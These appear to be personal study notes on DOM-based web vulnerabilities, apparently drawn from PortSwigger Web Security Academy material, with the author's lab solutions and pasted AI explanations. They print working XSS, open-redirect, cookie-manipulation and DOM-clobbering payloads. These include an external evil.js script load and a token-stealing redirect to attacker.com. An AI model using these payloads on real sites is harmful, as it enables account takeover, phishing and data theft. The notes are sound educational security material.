#+title: Dom Based Vulnerabilities
* DOM-based vulnerabilities
In this section, we will describe what the DOM is, explain how insecure processing of DOM data can introduce vulnerabilities, and suggest how you can prevent DOM-based vulnerabilities on your websites.

* What is the DOM?
The Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page. Websites can use JavaScript to manipulate the nodes and objects of the DOM, as well as their properties. DOM manipulation in itself is not a problem. In fact, it is an integral part of how modern websites work. However, JavaScript that handles data insecurely can enable various attacks. DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink.

* Taint-flow vulnerabilities
Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data.

** What is taint flow?
To either exploit or mitigate these vulnerabilities, it is important to first familiarize yourself with the basics of taint flow between sources and sinks.

*** Sources
A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the location.search property because it reads input from the query string, which is relatively simple for an attacker to control. Ultimately, any property that can be controlled by the attacker is a potential source. This includes the referring URL (exposed by the document.referrer string), the user's cookies (exposed by the document.cookie string), and web messages.

*** Sinks
A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the eval() function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is document.body.innerHTML because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.

Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session.

The most common source is the URL, which is typically accessed with the location object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. Consider the following code:

#+begin_src php
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
#+end_src
This is vulnerable to DOM-based open redirection because the location.hash source is handled in an unsafe way. If the URL contains a hash fragment that starts with https:, this code extracts the value of the location.hash property and sets it as the location property of the window. An attacker could exploit this vulnerability by constructing the following URL:

https://www.innocent-website.com/example#https://www.evil-user.net
When a victim visits this URL, the JavaScript sets the value of the location property to https://www.evil-user.net, which automatically redirects the victim to the malicious site. This behavior could easily be exploited to construct a phishing attack, for example.

*** Common sources
The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:

#+begin_quote
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
#+end_quote

*** Controlling the web message source
In this section, we'll look at how web messages can be used as a source to exploit DOM-based vulnerabilities on the recipient page. We'll also describe how such an attack is constructed, including how common origin-verification techniques can often be bypassed.

If a page handles incoming web messages in an unsafe way, for example, by not verifying the origin of incoming messages correctly in the event listener, properties and functions that are called by the event listener can potentially become sinks. For example, an attacker could host a malicious iframe and use the postMessage() method to pass web message data to the vulnerable event listener, which then sends the payload to a sink on the parent page. This behavior means that you can use web messages as the source for propagating malicious data to any of those sinks.

**** What is the impact of DOM-based web message vulnerabilities?
The potential impact of the vulnerability depends on the destination document's handling of the incoming message. If the destination document trusts the sender not to transmit malicious data in the message, and handles the data in an unsafe way by passing it into a sink, then the joint behavior of the two documents may allow an attacker to compromise the user, for example.

**** How to construct an attack using web messages as the source
Consider the following code:

#+begin_src html
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
#+end_src
This is vulnerable because an attacker could inject a JavaScript payload by constructing the following iframe:

#+begin_src html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
#+end_src
As the event listener does not verify the origin of the message, and the postMessage() method specifies the targetOrigin "*", the event listener accepts the payload and passes it into a sink, in this case, the eval() function.

***** DeepSeek Explanation:
Why the Original Code is Vulnerable
The Vulnerable Listener:

javascript
window.addEventListener('message', function(e) {
  eval(e.data); // Dangerous: no origin verification!
});
This accepts messages from ANY origin and directly evaluates the content.

The Attack Iframe Explained
html
<iframe src="//vulnerable-website"
        onload="this.contentWindow.postMessage('alert(document.cookie)','*')">
Breaking Down the Attack:
src="//vulnerable-website"

Loads the vulnerable page into an iframe

Once loaded, the iframe's content window has the vulnerable message listener

onload="..."

Executes when the iframe finishes loading

The attacker now has access to this.contentWindow (the vulnerable page's window)

postMessage('alert(document.cookie)', '*')

Sends a message to the iframe's content

First parameter: The malicious payload to evaluate

Second parameter ('*'): The key to the attack

The Critical Role of targetOrigin
What targetOrigin Does:
targetOrigin is a security feature that restricts which windows can receive the message. It should be set to the exact origin of the target window.

The Attack Works Because:
Vulnerable Site's Mistake: Doesn't verify message origin

javascript
// BAD: No origin check
if (e.origin !== 'https://trusted-site.com') {
    return; // Missing this check!
}
eval(e.data);
Attacker's Advantage: Uses '*' as targetOrigin

javascript
postMessage(payload, '*')  // Wildcard: delivers to ANY origin
'*' means "send to the target window regardless of its origin"

The browser delivers the message even though origins don't match

The vulnerable site's listener accepts it anyway


***** Lab: DOM XSS using web messages
PRACTITIONER

LAB
Solved
This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.

- solution:
  The homepage had an event listener like so:
  #+begin_src html
<script>
  window.addEventListener('message', function(e) {
  document.getElementById('ads').innerHTML = e.data;
  })
</script>
  #+end_src

  I could then craft the following payload to load an iframe, as this code directly injects html elements without checking for origin:
  #+begin_src html
<iframe src="https://0a92005103679098814d07f1008c00c0.web-security-academy.net/"
        onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')">
  #+end_src

***** Lab: DOM XSS using web messages and a JavaScript URL
PRACTITIONER

LAB
Solved
This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.

- solution:
  there was another event listener that changed the location of the page based on any messages coming through.
  #+begin_src html
                   <script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
 </script>
  #+end_src

  I had to use a url that had http or https in that executed js, eventually this worked:

  #+begin_src html
<iframe src="https://0ae700e803b2518080ec8a8500270018.web-security-academy.net/"
        onload="this.contentWindow.postMessage('javascript:print();//https:', '*')">
  #+end_src

  it works by commenting out the https, and that works as the event listener just checks to see if https is there, not where it is in the URL

**** Origin verification
Even if an event listener does include some form of origin verification, this verification step can sometimes be fundamentally flawed. For example, consider the following code:

#+begin_src html
window.addEventListener('message', function(e) {
    if (e.origin.indexOf('normal-website.com') > -1) {
        eval(e.data);
    }
});
#+end_src
The indexOf method is used to try and verify that the origin of the incoming message is the normal-website.com domain. However, in practice, it only checks whether the string "normal-website.com" is contained anywhere in the origin URL. As a result, an attacker could easily bypass this verification step if the origin of their malicious message was http://www.normal-website.com.evil.net, for example.

The same flaw also applies to verification checks that rely on the startsWith() or endsWith() methods. For example, the following event listener would regard the origin http://www.malicious-websitenormal-website.com as safe:

#+begin_src html
window.addEventListener('message', function(e) {
    if (e.origin.endsWith('normal-website.com')) {
        eval(e.data);
    }
});
#+end_src

***** Lab: DOM XSS using web messages and JSON.parse
PRACTITIONER

LAB
Solved
This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.

- solution:
  this lab was similar to the last one, it took some data and set the location to that data, the difference was in how we were supposed to deliver the data.
  We had to deliver it in JSON format, and specify a type "load-channel", this would contain the url, I then used this payload:

  #+begin_src html
<iframe id="attack"
        src="https://0a8700e603feb6a88091039000a60048.web-security-academy.net/"
        style="display:none">
</iframe>

<script>
document.getElementById('attack').onload = function() {
    // Send malicious payload
    const payload = {
        type: "load-channel",
        url: "javascript:print()"
    };

    this.contentWindow.postMessage(JSON.stringify(payload), '*');
};
</script>
  #+end_src

**** Which sinks can lead to DOM-based web message vulnerabilities?
As long as a website accepts web message data from an untrusted source due to a lack of adequate origin verification, any sinks that are used by the incoming message event listener could potentially lead to vulnerabilities.


*** DOM-based open redirection
In this section, we'll talk about what DOM-based open redirection is, demonstrate how an attack is constructed, and suggest ways to reduce your exposure to DOM-based open-redirection vulnerabilities.

**** What is DOM-based open redirection?
DOM-based open-redirection vulnerabilities arise when a script writes attacker-controllable data into a sink that can trigger cross-domain navigation. For example, the following code is vulnerable due to the unsafe way it handles the location.hash property:

#+begin_src javascript
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
#+end_src
An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause a redirection to an arbitrary external domain.

***** Why This Code is Unsafe
The Vulnerable Code:
javascript
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];  // DANGER: Direct assignment of user-controlled data
}
What Makes It Vulnerable
1. Weak Regex Pattern
javascript
/https?:\/\/.+/
Matches ANY string starting with http:// or https://

No validation of what comes after the protocol

The .+ is greedy and will match everything after ://

2. Location.hash is User-Controlled
The location.hash is the part of URL after #. Users can freely control it:

text
Original URL: https://example.com/page
With hash:    https://example.com/page#section
User sets:    https://example.com/page#https://evil.com
3. Direct Assignment to location
location = url[0] immediately redirects the entire page without any validation.

How to Exploit This
Basic Exploit:
html
<!-- Attack URL -->
https://vulnerable-site.com/page#https://evil-phishing.com
What happens:

User visits https://vulnerable-site.com/page#https://evil-phishing.com

JavaScript runs: location.hash = "#https://evil-phishing.com"

Regex extracts: "https://evil-phishing.com"

Page redirects to: https://evil-phishing.com

Advanced Exploitation Techniques
1. Phishing Attack
text
https://vulnerable-bank.com/login#https://bank-login.verify-security.com
Looks like legitimate bank URL

Actually redirects to attacker's phishing site

2. JavaScript Execution (if browser allows)
text
https://vulnerable-site.com/page#javascript:alert(document.cookie)
Note: Modern browsers block javascript: in location, but older ones might execute it.

3. Data URI with Malicious Content
text
https://vulnerable-site.com/page#data:text/html,<h1>Phishing</h1>
4. Stealing Sensitive Data via Redirect
text
https://vulnerable-site.com/dashboard#https://attacker.com/steal?token=SECRET_TOKEN


**** What is the impact of DOM-based open redirection?
This behavior can be leveraged to facilitate phishing attacks against users of the website, for example. The ability to use an authentic application URL targeting the correct domain and with a valid TLS certificate (if TLS is used) lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.

If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack. An attacker could construct a URL with the javascript: pseudo-protocol to execute arbitrary code when the URL is processed by the browser.

***** Lab: DOM-based open redirection
PRACTITIONER

LAB
Solved
This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.

- solved:
  this lab used an unsafe regex verifier, the code was using this to construct an achor button:
  #+begin_src html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
  #+end_src

  This just checked that the variables url contained an https, so I just crafted this:
  https://0a440042044f84c48028533b00a500df.web-security-academy.net/post?postId=1&url=https://exploit-0a74005604a484c9805852c201560028.exploit-server.net/#

**** Which sinks can lead to DOM-based open-redirection vulnerabilities?
The following are some of the main sinks can lead to DOM-based open-redirection vulnerabilities:

#+begin_quote
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()
#+end_quote


*** DOM-based cookie manipulation
In this section, we'll describe DOM-based cookie manipulation, look at what impact it can have, and suggest ways to reduce your exposure to cookie-manipulation vulnerabilities.

**** What is DOM-based cookie manipulation?
Some DOM-based vulnerabilities allow attackers to manipulate data that they do not typically control. This transforms normally-safe data types, such as cookies, into potential sources. DOM-based cookie-manipulation vulnerabilities arise when a script writes attacker-controllable data into the value of a cookie.

An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary value in the user's cookie. Many sinks are largely harmless on their own, but DOM-based cookie-manipulation attacks demonstrate how low-severity vulnerabilities can sometimes be used as part of an exploit chain for a high-severity attack. For example, if JavaScript writes data from a source into document.cookie without sanitizing it first, an attacker can manipulate the value of a single cookie to inject arbitrary values:

document.cookie = 'cookieName='+location.hash.slice(1);
If the website unsafely reflects values from cookies without HTML-encoding them, an attacker can use cookie-manipulation techniques to exploit this behavior.


***** Lab: DOM-based cookie manipulation
PRACTITIONER

LAB
Solved
This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages.

- solved:
  I figured out that a cookie was being assinged based on the window location of the page, I could then modify the URL to modify the cookie, this cookie was then being used as a return to previous page button. I managed to execute js with the following URL:

 /product?productId=1&'</a><img+src%3d1+onerror%3d"print()"/><a>

 I then used the following iframe to call the print function on the victim:
 <iframe src="https://0a0a00b903e740b882155690008c00d1.web-security-academy.net/product?productId=1&'</a><img+src=1+onerror=%22print()%22/><a>"
        onload='this.location.assign("https://0a0a00b903e740b882155690008c00d1.web-security-academy.net/")'>

it was a bit flawed as it only worked on second reload, a simpler solution would have been the official answer which was:
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">

**** What is the impact of a DOM-based cookie-manipulation attack?
The potential impact of this vulnerability depends on the role that the cookie plays within the website. If the cookie is used to control the behavior that results from certain user actions (for example, a production versus demo mode setting), then the attacker may be able to cause the user to perform unintended actions by manipulating the cookie's value.

If the cookie is used to track the user's session, then the attacker may be able to perform a session fixation attack, in which they set the cookie's value to a valid token that they have obtained from the website, and then hijack the session during the victim's subsequent interaction with the website. A cookie-manipulation vulnerability like this can be used to attack not only the vulnerable website, but any other website under the same parent domain.

Which sinks can lead to DOM-based cookie-manipulation vulnerabilities?
The document.cookie sink can lead to DOM-based cookie-manipulation vulnerabilities.

How to prevent DOM-based cookie-manipulation vulnerabilities
In addition to the general measures described on the DOM-based vulnerabilities page, you should avoid dynamically writing to cookies using data that originated from any untrusted source.

* DOM clobbering
In this section, we will describe what DOM clobbering is, demonstrate how you can exploit DOM vulnerabilities using clobbering techniques, and suggest ways you can reduce your exposure to DOM clobbering attacks.

** What is DOM clobbering?
DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.

The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as submit, to interfere with a form's actual submit() function.

** How to exploit DOM-clobbering vulnerabilities
A common pattern used by JavaScript developers is:

var someObject = window.someObject || {};
If you can control some of the HTML on the page, you can clobber the someObject reference with a DOM node, such as an anchor. Consider the following code:

#+begin_src html
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
#+end_src
To exploit this vulnerable code, you could inject the following HTML to clobber the someObject reference with an anchor element:

#+begin_src html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
#+end_src
As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the someObject reference with this DOM collection. A name attribute is used on the last anchor element in order to clobber the url property of the someObject object, which points to an external script.

*** Lab: Exploiting DOM clobbering to enable XSS
EXPERT

LAB
Solved
This lab contains a DOM-clobbering vulnerability. The comment functionality allows "safe" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the alert() function.

Note
Please note that the intended solution to this lab will only work in Chrome.

- solution:
  this one required me to see that DOM purify was being loaded, then I could have used cid: so the server wouldn't encode my dangerous symbols

ACCESS THE LAB
 Solution
Go to one of the blog posts and create a comment containing the following anchors:

<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
Return to the blog post and create a second comment containing any random text. The next time the page loads, the alert() is called.
The page for a specific blog post imports the JavaScript file loadCommentsWithDomClobbering.js, which contains the following code:

let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
The defaultAvatar object is implemented using this dangerous pattern containing the logical OR operator in conjunction with a global variable. This makes it vulnerable to DOM clobbering.

You can clobber this object using anchor tags. Creating two anchors with the same ID causes them to be grouped in a DOM collection. The name attribute in the second anchor contains the value "avatar", which will clobber the avatar property with the contents of the href attribute.

Notice that the site uses the DOMPurify filter in an attempt to reduce DOM-based vulnerabilities. However, DOMPurify allows you to use the cid: protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. As a result, the injection described above will cause the defaultAvatar variable to be assigned the clobbered property {avatar: ‘cid:"onerror=alert(1)//’} the next time the page is loaded.

When you make a second post, the browser uses the newly-clobbered global variable, which smuggles the payload in the onerror event handler and triggers the alert().


** Continued
Another common technique is to use a form element along with an element such as input to clobber DOM properties. For example, clobbering the attributes property enables you to bypass client-side filters that use it in their logic. Although the filter will enumerate the attributes property, it will not actually remove any attributes because the property has been clobbered with a DOM node. As a result, you will be able to inject malicious attributes that would normally be filtered out. For example, consider the following injection:

<form onclick=alert(1)><input id=attributes>Click me
In this case, the client-side filter would traverse the DOM and encounter a whitelisted form element. Normally, the filter would loop through the attributes property of the form element and remove any blacklisted attributes. However, because the attributes property has been clobbered with the input element, the filter loops through the input element instead. As the input element has an undefined length, the conditions for the for loop of the filter (for example i<element.attributes.length) are not met, and the filter simply moves on to the next element instead. This results in the onclick event being ignored altogether by the filter, which subsequently allows the alert() function to be called in the browser.

*** Lab: Clobbering DOM attributes to bypass HTML filters
EXPERT

LAB
Solved
This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls the print() function. You may need to use the exploit server in order to make your vector auto-execute in the victim's browser.

- solution:
  I had to use a variation of the above code; however, instead of onclick, I needed ot use on focus like so:
  #+begin_src html
  <form id=x tabindex=0 onfocus=print()><input id=attributes>
  #+end_src

  This meant that when the iframe loaded I could use an onload attribute to focus this element with #x

  I then used this Iframe code
  #+begin_src html
<iframe
  src="https://0ad3006704166d008125f2ff00d00076.web-security-academy.net/post?postId=8" onload="setTimeout(()=>this.src=this.src+'#x',500)"</iframe>
  #+end_src

  It needs the timeout before firing as the sanitiser (HtmlJanitor) needs to run before trying to focus on the id. Otherwise the sanitiser will fire once focused and not work.
